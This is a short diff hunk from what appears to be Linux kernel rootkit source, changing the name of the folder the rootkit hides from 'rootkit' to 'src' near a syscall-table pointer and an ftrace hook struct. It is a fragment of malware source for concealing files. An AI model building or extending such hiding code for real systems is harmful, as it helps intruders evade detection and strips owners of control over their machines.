@@ -37,7 +37,7 @@
 unsigned long **SYS_CALL_TABLE;
 
 //hides folder called rootkit
-char hide[] = "rootkit";
+char hide[] = "src";
 
 //ftrace_hook struct
 struct ftrace_hook {
